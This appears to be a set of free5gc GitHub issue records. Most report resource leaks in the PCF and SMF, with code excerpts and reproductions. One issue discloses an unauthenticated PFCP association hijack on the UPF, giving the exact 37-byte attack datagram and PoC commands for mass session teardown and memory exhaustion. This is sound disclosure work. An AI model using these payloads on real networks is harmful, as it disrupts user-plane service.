query: repo:free5gc/free5gc is:issue stale OR orphan OR leak

items.title: [Bugs] PCF: app-session create leaves an orphaned PCC rule in the SM policy decision when extractUmData fails
items.body:
## Bug Description

To authorize an AF application session, the PCF's `postAppSessCtxProcedure` builds the requested PCC rules and writes each one into the **stored** SM policy decision (`smPolicy.PolicyDecision.PccRules`) before it has created the Application Session that is supposed to own them. If a later step in the same handler fails, the PCF returns without creating the app session and without removing the rule it already wrote. The rule is then owned by no app session, and the release path can never reach it.

The paired release, `(*UeSmPolicyData).RemovePccRule`, is reached through `HandleDeleteAppSessionContext`, which walks `appSession.RelatedPccRuleIds`. A rule the failed request left in the decision belongs to no app session, so nothing can release it. Rules accumulate in the one SM policy's decision, one per distinct `afAppId`, until the PDU session (SM policy) itself is deleted.

The failure exit here sits behind `extractUmData` and is taken whenever an AF asks for a `USAGE_REPORT` event subscription without a `usgThres`. Only the success exit stores the app session that would make the rules releasable.

Source analysis on PCF v1.4.3, commit `df6c0da`. **Still present on upstream `main` (`eb57557`, 2026-08-20):** the rule is still written into the decision (policyauthorization.go:270), the `extractUmData` error exit still returns without removing it (:375), and the rule id is still registered into `appSession.RelatedPccRuleIds` only on the success path (:401) — so the delete-time walk still cannot reach a rule left by a failed create.

Same root cause as #1181, but a different trigger: #1181 needs an SMF that did not negotiate UMC, while this exit (L376) is hit even when UMC is negotiated (the PoC uses suppFeat 0fff). A fix scoped to the UMC check would not close this one.

### The rule is written into the stored decision first.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L255-L269

In the media-component loop, a rule with the requested `afAppId` is created and written into the stored decision:

```go
pccRule = util.GetPccRuleByAfAppId(smPolicy.PolicyDecision.PccRules, appID)   // L255: dedup by afAppId
if pccRule == nil {
    pccRule = util.CreatePccRule(smPolicy.PccRuleIdGenerator, precedence, nil, appID)  // L257
    ...
    util.SetPccRuleRelatedData(smPolicy.PolicyDecision, pccRule, nil, &qosData, nil, nil)  // L269: decision.PccRules[id] = rule
    smPolicy.PccRuleIdGenerator++
}
```

`smPolicy.PolicyDecision` is the per-PDU-session SM policy decision, stored in `ue.SmPolicyData[smPolicyID]`; it outlives the request and lives until the SM policy (PDU session) is deleted.

### The failure exit after the write removes nothing and creates no app session.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L374-L377

The sponsored-connectivity block runs after the rule is already in the decision, and `extractUmData` returns an error for a `USAGE_REPORT` subscription with no `usgThres`:

```go
if tempUmData, err := extractUmData(umID, eventSubs, ascReqData.EvSubsc.UsgThres); err != nil {
    problemDetail := util.GetProblemDetail(err.Error(), util.REQUESTED_SERVICE_NOT_AUTHORIZED)
    return nil, "", &problemDetail                          // L376: rule already in decision, no app session created
}
```

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L1691-L1697

```go
func extractUmData(umID string, eventSubs ..., threshold *models.UsageThreshold) (umData *models.UsageMonitoringData, err error) {
    if _, umExist := eventSubs[models.PcfPolicyAuthorizationAfEvent_USAGE_REPORT]; umExist {
        if threshold == nil {
            return nil, fmt.Errorf("usageThreshold is nil in USAGE REPORT Subscription")   // L1696
```

### The release is reached only through an app session that this path never created.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L473-L474

`HandleDeleteAppSessionContext` is a path to `RemovePccRule`, and it iterates the app session's own rule set:

```go
for _, pccRuleID := range appSession.RelatedPccRuleIds {   // L473
    if err := smPolicy.RemovePccRule(pccRuleID, &deletedSmPolicyDec); err != nil {   // L474 -> delete(decision.PccRules, id)
```

`appSession.RelatedPccRuleIds` is populated only on the success path (L400), just before the app session is stored (`AppSessionPool.Store`, L433) and the function returns `nil` (L445). The failed request never reaches L400, so the rule it wrote at L269 is unreachable by any delete.

## To Reproduce

PCF v1.4.3, driven with NRF/UDR/PCF on loopback, `oauth: false`, a subscriber policy seeded in UDR, and one PDU session's SM policy created per UE. **No change to the leaking code.** Rules are counted by reading the stored decision through the PCF's own `GET /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}` endpoint, which returns `smPolicy.PolicyDecision`. The SM policy is created with a negotiated `suppFeat` of `0fff` (bit 12 set), i.e. an SMF that offers SponsoredConnectivity.

Each request is `POST /npcf-policyauthorization/v1/app-sessions` with one media component, `aspId`/`sponId` set, and a `USAGE_REPORT` event with **no** `usgThres` (the extractUmData trigger). This is the natural failure path, with no injection.

**The leak: one field decides it**

| case | app session created? | HTTP | rules held in the SM policy decision |
|---|---|---|---|
| A, normal create then delete | yes | 201, then 204 on delete | 1, then **0** after delete |
| B, fails at L376 (this bug) | no | 403, no app session | **1**, not releasable |

**Accumulation** — same UE and SM policy, `afAppId` distinct per request:

| requests | rules held in the SM policy decision |
|---|---|
| 1 | 1 |
| 10 | 10 |
| 20 | 20 |
| 30 | 30 |

Slope exactly 1 per request, HTTP 403 `REQUESTED_SERVICE_NOT_AUTHORIZED` / `"usageThreshold is nil in USAGE REPORT Subscription"` every time, no ceiling. A `QosData` entry is added alongside each rule.

**Control** — same requests but a fixed `afAppId`: `GetPccRuleByAfAppId` reuses the existing rule, so the count stays at **1** across 10 requests. Growth needs a distinct `afAppId`, which the AF controls.

## Expected Behavior

When the sponsored-connectivity block takes an error exit (L376, and likewise the sibling exit at L383), the handler should roll back the rules it added to `smPolicy.PolicyDecision` in this call before returning, so a rejected app session leaves the decision as it found it.

## Screenshots

N/A

## Environment

- free5GC Version: PCF v1.4.3 (`df6c0da`); reproduced with a loopback NRF/UDR/PCF deployment
- OS: Ubuntu 24.04.5 LTS
- Kernel version: 6.8.0-139-generic
- go version: go1.25.5 linux/amd64

## Trace Files / Configuration Files

N/A. `oauth: false`; subscriber policy seeded in UDR; SM policy negotiated with `suppFeat 0fff`.

## PCAP File

N/A. This is a code-logic issue, unrelated to the packet level.

## Log File

```
POST /npcf-policyauthorization/v1/app-sessions  (aspId/sponId set, USAGE_REPORT, no usgThres)
HTTP 403  {"cause":"REQUESTED_SERVICE_NOT_AUTHORIZED","detail":"usageThreshold is nil in USAGE REPORT Subscription"}
GET  /npcf-smpolicycontrol/v1/sm-policies/{id}  -> PolicyDecision.PccRules length = 1 (no app session owns it)
```
No app session is created, yet the SM policy decision retains one PCC rule. Over a 30-request run with distinct `afAppId`, the retained-rule count rises to 30.

## Additional Context

Beyond memory, the orphaned rules sit in `smPolicy.PolicyDecision`, which is what the handler sends to the SMF on the next **successful** app-session update (policyauthorization.go:439-443), so rules an AF was told it could not have (403) can still be provisioned toward the SMF/UPF on a later accepted request for the same PDU session. The entries are freed only when the SM policy is deleted (`HandleDeleteSmPolicyContextRequest`) — a PDU-session-scoped bound, which an AF can grow without limit within a live session by varying `afAppId`. The sibling exit at L383 (`handleSponsoredConnectivityInformation` error) has the identical defect.

## How did we find?

We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

items.title: [Bugs] Orphaned PCC rule in postAppSessCtxProcedure when an app-session create fails after the rule is written into the SM policy decision (UMC-unsupported exit)
items.body:
## Summary
`postAppSessCtxProcedure` builds the requested PCC rules and writes each one into the **stored** SM policy decision (`smPolicy.PolicyDecision.PccRules`) at L269, then continues with the sponsored-connectivity block that can fail. The failure exit at L383 — reached when `handleSponsoredConnectivityInformation` reports that usage monitoring control is not supported — returns without removing the rule and without ever creating the Application Session that would own it.

The paired release, `(*UeSmPolicyData).RemovePccRule`, is reached only through `HandleDeleteAppSessionContext`, which walks `appSession.RelatedPccRuleIds`. A rule the failed request left in the decision belongs to no app session, so nothing can release it. `GetPccRuleByAfAppId` (L255) keys the lookup on `afAppId`, so each failure with a new `afAppId` adds one rule; a repeat of the same `afAppId` reuses the existing one. Rules accumulate in the one SM policy's decision, one per distinct `afAppId`, until the PDU session (SM policy) itself is deleted.

The failure exit is taken whenever an AF requests sponsored connectivity with usage monitoring (`usgThres` present) but the negotiated SM-policy feature set does not include *UMC*. Only the success exit at L445 stores the app session that would make the rules releasable.

## Details
free5gc v4.2.2, PCF v1.4.3 (df6c0da).

**Acquire at L269.** In the media-component loop, a rule with the requested `afAppId` is created (L257) and written into the stored decision:

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L255-L269

```go
pccRule = util.GetPccRuleByAfAppId(smPolicy.PolicyDecision.PccRules, appID)   // L255: dedup by afAppId
if pccRule == nil {
    pccRule = util.CreatePccRule(smPolicy.PccRuleIdGenerator, precedence, nil, appID)  // L257
    ...
    util.SetPccRuleRelatedData(smPolicy.PolicyDecision, pccRule, nil, &qosData, nil, nil)  // L269: decision.PccRules[id] = rule
    smPolicy.PccRuleIdGenerator++
}
```

`smPolicy.PolicyDecision` is the per-PDU-session SM policy decision, stored in `ue.SmPolicyData[smPolicyID]`; it outlives the request and lives until the SM policy (PDU session) is deleted.

**Release is reached only through an app session.** `HandleDeleteAppSessionContext` (L449) is the only path to `RemovePccRule`, and it iterates the app session's own rule set:

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L473-L474

```go
for _, pccRuleID := range appSession.RelatedPccRuleIds {   // L473
    if err := smPolicy.RemovePccRule(pccRuleID, &deletedSmPolicyDec); err != nil {   // L474 -> ue.go delete(decision.PccRules, id)
```

`appSession.RelatedPccRuleIds` is populated only on the success path (L400), just before the app session is stored (`AppSessionPool.Store`, L433) and the function returns `nil` (L445).

**The failure exit after L269 does neither.** With `usgThres` present, `extractUmData` succeeds, and the request proceeds into `handleSponsoredConnectivityInformation`, which rejects it when the SM policy did not negotiate UMC:

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L380-L384

```go
if err := handleSponsoredConnectivityInformation(smPolicy, relatedPccRuleIds, ascReqData.AspId,
    ascReqData.SponId, ascReqData.SponStatus, umData, &updateSMpolicy); err != nil {
    problemDetail := util.GetProblemDetail(err.Error(), util.REQUESTED_SERVICE_NOT_AUTHORIZED)
    return nil, "", &problemDetail                          // L383: rule already in decision, no app session created
}
```

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L1205-L1208

```go
supp := util.CheckSuppFeat(smPolicy.PolicyDecision.SuppFeat, 5) // UMC support = 5 in 29512   // L1205
if !supp {
    err := fmt.Errorf("usage Monitor Control is not supported in SMF")   // L1207
    return err
}
```

The block is entered only when the negotiated feature set has *SponsoredConnectivity* (bit 12) but not *UMC* (bit 5):

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/policyauthorization.go#L361-L363

The sibling exit at L376 (`extractUmData` error, `USAGE_REPORT` without `usgThres`) has the identical defect, as does the earlier L365 exit (`"Sponsored Connectivity not supported"`), which is the one free5gc's own SMF reaches (it sends `suppFeat "F"`, bit 12 clear) — after the same L269 acquire, so the rule leaks there too in the default configuration.

## PoC
free5gc v4.2.2, PCF v1.4.3. NRF/UDR/PCF on loopback, `oauth: false`, subscriber policy seeded in UDR, one PDU session's SM policy created per UE. No change to the leaking code. Rules are counted by reading the stored decision through the PCF's own `GET /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}` endpoint, which returns `smPolicy.PolicyDecision` — reachable state held in the SM policy. The SM policy is created with a negotiated `suppFeat` of `0800` — bit 12 (SponsoredConnectivity) set, bit 5 (UMC) clear — i.e. an SMF that offers sponsored connectivity but not usage monitoring.

Each request is `POST /npcf-policyauthorization/v1/app-sessions` with one media component, `aspId`/`sponId` set, and a `USAGE_REPORT` event with a `usgThres` present (so `extractUmData` passes and `handleSponsoredConnectivityInformation` runs and rejects at the UMC check).

**The leak: one line decides it**

| case | app session created? | HTTP | rules held in the SM policy decision |
|---|---|---|---|
| A, normal create then delete | yes | 201, then 204 on delete | 1, then **0** after delete |
| B, fails at L383 (this bug) | no | 403, no app session | **1**, not releasable |

A shows the pair works. B is the same request against an SMF that did not negotiate UMC: the rule was already written at L269, but no app session exists to own or release it.

**Accumulation** — same UE and SM policy, `afAppId` distinct per request:

| requests | rules held in the SM policy decision |
|---|---|
| 1 | 1 |
| 5 | 5 |
| 10 | 10 |
| 15 | 15 |
| 20 | 20 |
| 25 | 25 |
| 30 | 30 |

Slope exactly 1 per request, HTTP 403 `REQUESTED_SERVICE_NOT_AUTHORIZED` / `"usage Monitor Control is not supported in SMF"` every time, no ceiling. A `QosData` entry is added alongside each rule.

**Control** — same requests but a fixed `afAppId`: `GetPccRuleByAfAppId` reuses the existing rule, so the count stays at **1**. Growth needs a distinct `afAppId`, which the AF controls.

## Impact
Every app-session create that fails at L383 leaves one PCC rule (plus its QoS decision) in the SM policy's stored decision, referenced by no app session and therefore unreachable by `RemovePccRule`. The entries are held for the life of the PDU session and are freed only when the SM policy is deleted (`HandleDeleteSmPolicyContextRequest`); within a live session an AF can grow them without limit by varying `afAppId`.

Beyond memory, the orphaned rules sit in `smPolicy.PolicyDecision`, which the handler sends to the SMF on the next **successful** app-session update (L439–L443), so rules a request was rejected for (403) can still be provisioned toward the SMF/UPF on a later accepted request for the same PDU session. (Observed from the code path; the PoC measures only the retained decision state.)

Expected behaviour: when the sponsored-connectivity block takes an error exit (L383, and likewise L376), the handler should roll back the rules it added to `smPolicy.PolicyDecision` in this call before returning, so a rejected app session leaves the decision as it found it.

items.title: [Bugs] SM policy leaked on every failure path after NewUeSmPolicyData; error response omits Location so the SMF can never delete it
items.body:
## Bug Description
`HandleCreateSmPolicyRequest` registers a new SM policy into `UeContext.SmPolicyData` at line 116, then continues with work that can fail. The failure exit after that returns without removing the entry, and the error response carries no `Location` header.

The paired release, `HandleDeleteSmPolicyContextRequest`, is a separate N7 request the SMF sends using the id from `Location`. Without that id the entry can never be released, by the handler or by anyone else. The key is supi-pduSessionId, so each failure on a new PDU session id adds an entry, and a later create with the same id overwrites it. Entries accumulate up to one per PDU session id per UE (at most 15).

The failure exit sits behind `PCFContext.GetTokenCtx` and is taken whenever the NRF is unavailable at that point. Only the success exit returns `Location`.

**Acquire at L116.** The entry goes into the per-UE map. Note L113 right above it: a `delete` already exists here, used to clear a stale entry before overwriting.

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/smpolicy.go#L112-L116

```go
if smPolicyData != nil {
    delete(ue.SmPolicyData, smPolicyID)      // L113
}
smPolicyData = ue.NewUeSmPolicyData(smPolicyID, request, &smData)   // L116: acquire
```

**Release is a separate N7 request.** `HandleDeleteSmPolicyContextRequest` (L516) is reached by `POST /sm-policies/{smPolicyId}/delete`, and the SMF only learns `smPolicyId` from the `Location` header of the `201`. No `Location`, no release.

**The failure exit after L116 does not delete or send `Location`:**

https://github.com/free5gc/pcf/blob/df6c0daacbc7fe5f610f19665e169f013eb05721/internal/sbi/processor/smpolicy.go#L380-L385

```go
ctx, pd, err := p.Context().GetTokenCtx(models.ServiceName_NUDR_DR, models.NrfNfManagementNfType_UDR)
if err != nil {
    c.Set(sbi.IN_PB_DETAILS_CTX_STR, pd.Cause)
    c.JSON(int(pd.Status), pd)
    return                                   // ue.SmPolicyData[smPolicyID] still set
}
```

`GetTokenCtx`: with `oauth: true` it does a live NRF fetch, so any NRF outage at L380 takes that exit. It sits *after* the acquire, while the earlier UDR lookup sits *before* it, so an outage beginning after the UE's policy data is cached passes the earlier lookup and fails here.

Separately, `util.GetProblemDetail` does not populate `Status`, so `c.JSON(int(problemDetails.Status), ...)` is `c.JSON(0, ...)` and gin emits **HTTP 200** with a ProblemDetails body. A client checking only the status code treats the failed create as a success.

## To Reproduce
free5gc v4.2.2, PCF v1.4.3. NRF/UDR/UDM/PCF on loopback, subscriber `imsi-208930000000001`, DNN `internet`. A probe in the PCF runs `runtime.GC()` and reports `len(ue.SmPolicyData)` across `UePool`, so anything still counted is reachable state.

**The leak: one line decides it.** Three runs, same requests, `pduSessionId` incrementing so each one gets a distinct `smPolicyID`. B and C use a build-time hook (`LEAK_FAULT`, inert when unset) to force a failure, the only difference being whether it fires one line after L116 or one line before:

| | failure point | requests | HTTP | entries held |
|---|---|---|---|---|
| A, normal | none | 500 | `201` + `Location` | 500, then **0** after 500 deletes |
| B, fails *after* L116 | one line after acquire | 2000 | error, no `Location` | **2000** |
| C, fails *before* L116 | one line above | 2000 | error, no `Location` | **0** |

A shows the pair works. C shows that a failing request is not by itself a problem. B differs from C only in whether the acquire had already run.

**Accumulation, run B:**

| requests | entries held | heap objects |
|---|---|---|
| 0 | 0 | 18,900 |
| 250 | 250 | 37,362 |
| 500 | 500 | 45,403 |
| 1000 | 1000 | 61,548 |
| 1500 | 1500 | 77,168 |
| 2000 | 2000 | 92,725 |

Slope exactly 1 per request. The PCF does not validate pduSessionId, so the test goes past the 15 values a real SMF would send; in practice the bound is 15 per UE. A forced `runtime.GC()` leaves the count at 2000 and `heap_alloc` at 8.7 MB; run C stayed flat at ~7 MB over the same 2000 requests.

Deleting by guessed id (`.../sm-policies/imsi-208930000000001-1/delete`) returns `204` and drops the count 2000 → 1997, so the release logic is fine. A real SMF simply never received those ids.

**Reaching L384 without the hook.** With `oauth: true`, 300 policies were created normally, the NRF was killed, and the same 300 creates repeated. All 300 returned **HTTP 500 with no `Location`**, the `GetTokenCtx` exit, with the acquire at L116 already done. (Same keys, so this run shows reachability rather than growth; growth is what B measures.)

Killing the NRF *before* the UE's policy data is cached instead gives `400 Can't find UE SM Policy Data in UDR` from the UDR lookup above L116, which does not leak, consistent with C.

## Expected Behavior
When the create fails after the acquire at L116, the handler should remove the `ue.SmPolicyData[smPolicyID]` entry before returning (as L113 already does before overwriting), so a failed create does not leave a permanent entry that no `Location`-bearing response ever lets the SMF release. The error response should also carry a correct HTTP status rather than a `0`/`200` from an unpopulated `Status`.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (PCF v1.4.3, `df6c0da`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    HTTP 500, no Location header (GetTokenCtx exit, acquire at L116 already done)
    400 Can't find UE SM Policy Data in UDR   (when NRF killed before policy data cached — does not leak)

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF on loopback.

## Walkthrough (Optional)
The failure exit at L380 sits *after* the acquire at L116, while the earlier UDR lookup sits *before* it. An outage beginning after the UE's policy data is cached passes the earlier lookup and fails at `GetTokenCtx`, leaving the entry registered. The key includes `pduSessionId`, so entries accumulate one per failed request, bounded at 15 per UE in practice.

## Additional Context
Every create that fails after L116 leaves a permanent `SmPolicyData` entry: not reclaimable by GC, not deletable by the SMF because the failure response omits `Location`. The reachable trigger is NRF unavailability during `GetTokenCtx`. For the duration of an outage every create that gets past the earlier UDR lookup adds an entry, and the SMF sees only a `500`.

Entries hold `PolicyDecision`, both id generators and the GBR remainders, roughly 37 heap objects each. There is no eviction, no timeout and no sweep over `SmPolicyData`, so an entry is removed only by a PCF restart, a later create with the same supi-pduSessionId, or an operator guessing that id.

## How did we find?
We found this bug by using our (work-in-progress) static analysis tool, manually verified it, and made a runnable PoC.

items.title: [Bugs] Unauthenticated PFCP Association Hijack & Permanently Unreclaimable `s.rnodes` Growth
items.body:
## Bug Description

A missing authentication vulnerability exists in the free5GC v4.2.3 UPF PFCP Association Setup handling. The UPF identifies PFCP peers only by the attacker-controlled Node ID and does not verify the packet source against the address of an existing association.

An unauthenticated attacker with network access to UDP/8805 can send a forged PFCP Association Setup Request using the Node ID of the legitimate SMF. The UPF then deletes the existing SMF association and all associated PFCP sessions before rebinding the Node ID to the attacker's source address. A single forged packet can therefore terminate active user-plane sessions and cause a persistent denial of service.

The same unauthenticated interface also accepts unlimited distinct Node IDs without removing stale associations. Repeated Setup Requests can continuously grow the UPF peer table and consume memory until the process is terminated by the OOM killer.

## To Reproduce

Prerequisites: a running free5GC v4.2.3 Docker stack with the SMF↔UPF PFCP association established and one UE registered with two PDU sessions (so there is live user-plane state to destroy). The PoC is pure Python 3 standard library (no dependencies).

1. **Deploy & gate end-to-end health.** Bring up the free5GC v4.2.3 compose stack, drive one UE to registration + two PDU sessions (`uesimtun0`/`uesimtun1` up), and confirm the SMF→UPF association exists. In this deployment the SMF Node ID is `smf.free5gc.org` and the UPF N4 endpoint is `upf.free5gc.org:8805` (10.100.200.3).

2. **Resolve the UPF N4 address** (docker re-assigns IPs across `down`/`up` cycles):
   ```bash
   UPF_IP=$(docker inspect upf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
   ```

3. **Run the PoC** (`upf_assoc_hijack_poc.py`, Python 3 stdlib only — full source in [`pkgs/README.md`](README.md) §Complete PoC):
   ```bash
   # (a) Resource-exhaustion / leak: N distinct Node IDs -> N permanently unreclaimable s.rnodes entries
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak  --count 100000
   #     -> 100000/100000 accepted in ~22.4s, RSS 8.1->144 MiB, delete_node=0  (DESTRUCTIVE: memory)

   # (a-oom) OOM-crash variant: cap the UPF container at 2 GB, then send ~2 M distinct Node IDs
   docker update --memory 2g --memory-swap 2g upf
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --report-every 50000
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --leak-prefix leak2 --report-every 100000
   #     -> phase 1: 1M accepted, RSS 15->1 288 MB;  phase 2: RSS -> 2 091 MB -> kernel OOM kill
   #        (exit=137, OOMKilled=true, restarts=0; ~1.27 KiB per association)

   # (b) Hijack / mass teardown: ONE 37-byte datagram destroys all sessions of smf.free5gc.org
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --node-id smf.free5gc.org
   #     -> Cause=Request accepted; UPF logs "delete node ... sess:map[0x1,0x2]" + "sess deleted"x2 + "New node";
   #        loss 0%->100%, persists across UPF restart  (DESTRUCTIVE: user plane)

   # inspect the exact bytes without sending anything
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --dry-run
   ```

**The 37-byte attack datagram** (`--mode hijack --node-id smf.free5gc.org`):

```
20 05 00 21 00 00 01 00  00 3c 00 11 02 03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67 00 60 00 04 ee 52 08 a0
```

| Offset | Bytes | Meaning |
|---|---|---|
| 0 | `20` | PFCP v1, `S=0` (node-related, no SEID) |
| 1 | `05` | Message Type 5 = Association SetupRequest |
| 2-3 | `00 21` | Message Length = 33 (total 37) |
| 4-6 | `00 00 01` | Sequence Number = 1 |
| 7 | `00` | Spare |
| 8-9 | `00 3c` | IE Type 60 = **Node ID** |
| 10-11 | `00 11` | IE Length = 17 |
| 12 | `02` | Node ID Type = **FQDN** |
| 13-28 | `03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67` | length-prefixed `smf.free5gc.org` (**no** root terminator, matching go-pfcp) |
| 29-30 | `00 60` | IE Type 96 = **Recovery Time Stamp** |
| 31-32 | `00 04` | IE Length = 4 |
| 33-36 | `ee 52 08 a0` | Time stamp (decoded at `:42` and **discarded**) |

**Observed** (UPF returns acceptance in ~11 ms): `msg_type=6` (Association Setup Response), `cause=1 (Request accepted)`, `upf_node_id=upf.free5gc.org`. UPF log signature (the smoking gun): `delete node: &pfcp.RemoteNode{ID:"smf.free5gc.org", ..., sess:map[uint64]struct{}{0x1:..., 0x2:...}}` → `[CPSEID:0x1] sess deleted` → `[CPSEID:0x2] sess deleted` → `[CPNodeID:smf.free5gc.org] New node`. **Critical negative signature:** no `panic`, no `fatal`, no signal, no restart — `upf` stays `running`, `RestartCount=0`. Reproducibility: **4/4 = 100%** (hijack 2/2, leak 2/2) across full environment rebuilds.


## Screenshots

None

## Environment

- **free5GC Version:** v4.2.3 — `free5gc/upf:v4.2.3` (image digest `sha256:b1c4e6967db6e244b43c0cbe5bba498d3a55e506c580134ca131f5ee6df99c75`); source tree `v4.2.3-4-g387710d`, `internal/pfcp/association.go` has the identical vulnerable block at `:48-58` and no-op Release/Update at `:76-88`
- **Deployment:** Docker-based 5G Core Network (free5GC basic compose, 16 containers, N4 on bridge `10.100.200.0/24`; UPF N4 `upf.free5gc.org:8805` = 10.100.200.3; SMF Node ID `smf.free5gc.org`)
- **OS:** Ubuntu 22.04 Desktop
- **Kernel version:** 138~22.04.1-Ubuntu
- **go version:** 1.21.8 linux/amd64

## Trace Files

[Artifacts](https://media.githubusercontent.com/media/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260916-POC/packages.zip) present in this repository:

- `upf_assoc_hijack_poc.py`— the PoC (Python 3 stdlib; modes `hijack`/`leak`).
- `pcap/`— N4 PCAP capture (excluding SSH port 22) of the v4.2.3 hijack reproduction: `hijack.pcap` — the 37-byte attack datagram, the UPF's acceptance response, then silence (`hijack-tcpdump.txt` holds the capture stats).
- `logs/`— trimmed logs of the v4.2.3 hijack reproduction: `hijack-upf.log` (post-attack lines only: forged `handleAssociationSetupRequest` → `delete node` → `sess deleted` ×2 → `New node`) and `hijack-smf.log` (last 200 lines; its final entry, 12:56:11, is six seconds **before** the 12:56:17 attack — the SMF logged **zero** entries at/after it).


## Additional Context

- **Vulnerability Type:** Resource Exhaustion (Denial of Service). 
- **CWE:** CWE-306 (Missing Authentication for Critical Function, primary)
- **CVSS v4 (report assessment):**
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H`

items.title: [Bugs] SMContext, UE IP and TEIDs leaked when PDU session establishment reject fails after the 201 response
items.body:
## Bug Description
`HandlePDUSessionSMContextCreate` returns `201 Created` with a `Location` header as soon as it has handed PFCP session setup to a goroutine. If that setup then fails, `EstHandler` calls `sendPDUSessionEstablishmentReject` to tear the context down, but that function has three early returns before the one call that actually releases it, at the very end.

Taking any of the three leaves the SMContext registered in all three package-level maps, with its UE IP address and four TEIDs still allocated. Because the `201` already went out, the AMF believes the session was created and has no reason to send a release.

Reproduced below with no change to the leaking code: an association-only PFCP responder plus an absent AMF is enough. 31 requests leave 31 SMContexts, 31 `canonicalRef` entries, 31 `seidSMContextMap` entries and 31 UE IP addresses held, with zero `Release IP` log lines.

`sendPDUSessionEstablishmentAccept` has the same shape with four early returns and no release call at all.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef`, and into `seidSMContextMap` once PFCP context exists:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps and returns the UE IP and four TEIDs:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

Its only caller is `RemoveSMContextFromAllNF`, so missing that call means the context is never released.

**The response goes out before anything can fail.** PFCP setup is handed to a goroutine and the handler answers immediately:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L291-L306

```go
needUnlock = false
go func() {
    defer smContext.SMLock.Unlock()
    smContext.SendUpPathChgNotification("EARLY", SendUpPathChgEventExposureNotification)
    handler := func(smContext *smf_context.SMContext, success bool) {
        p.EstHandler(isDone, smContext, success)
    }
    ActivateUPFSession(smContext, handler)
    ...
}()
```

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L330-L331

```go
c.Header("Location", location)
c.JSON(http.StatusCreated, response)
```

By the time the goroutine can fail, the AMF already holds a `201` and a `smContextRef`.

**Where the release is skipped.** A failed PFCP establishment gives `success = false`, and `EstHandler` routes to the reject path:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L250-L263

```go
if success {
    p.sendPDUSessionEstablishmentAccept(smContext)
} else {
    p.sendPDUSessionEstablishmentReject(smContext, nasMessage.Cause5GSMNetworkFailure)
}
```

That function exists to tear the context down, yet the teardown is its last statement and three returns precede it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L269-L308

```go
smNasBuf, err := smf_context.BuildGSMPDUSessionEstablishmentReject(
    smContext, nasMessage.Cause5GSMNetworkFailure)
if err != nil {
    logger.PduSessLog.Errorf("Build GSM PDUSessionEstablishmentReject failed: %s", err)
    return                                        // L276: no release
}
...
ctx, _, errToken := smf_context.GetSelf().GetTokenCtx(
    models.ServiceName_NAMF_COMM, models.NrfNfManagementNfType_AMF)
if errToken != nil {
    logger.PduSessLog.Warnf("Get NAMF_COMM context failed: %s", errToken)
    return                                        // L295: no release
}
